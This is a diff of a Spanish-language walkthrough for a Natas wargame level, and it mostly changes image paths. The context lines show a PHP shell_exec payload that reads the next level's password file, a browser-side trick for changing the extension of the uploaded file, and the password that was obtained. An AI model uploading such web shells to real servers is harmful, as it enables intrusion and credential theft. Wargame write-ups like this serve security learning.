@@ -11,10 +11,22 @@ echo shell_exec("cat /etc/natas_webpass/natas13");
 ?>
 ```
 Después vamos a subir el archivo y antes de darle al archivo upload vamos a editar la extensión del archivo desde el navegador con el f12
-![](../../../images/Pasted%20image%2020260422134934.png)
-![](../../../images/Pasted%20image%2020260422134949.png)
+
+
+![](../../images/Pasted%20image%2020260422134934.png)
+
+
+
+
+![](../../images/Pasted%20image%2020260422134949.png)
+
+
 Una vez hecho esto subimos el archivo y nos dirigimos al enlace proporcionado
-![](../../../images/Pasted%20image%2020260422135851.png)
+
+
+![](../../images/Pasted%20image%2020260422135851.png)
+
+
 Nos dirigimos al enlace y nos damos cuenta que nuestro script funcionó y nos da la siguiente contraseña 
 ``` bash
 trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
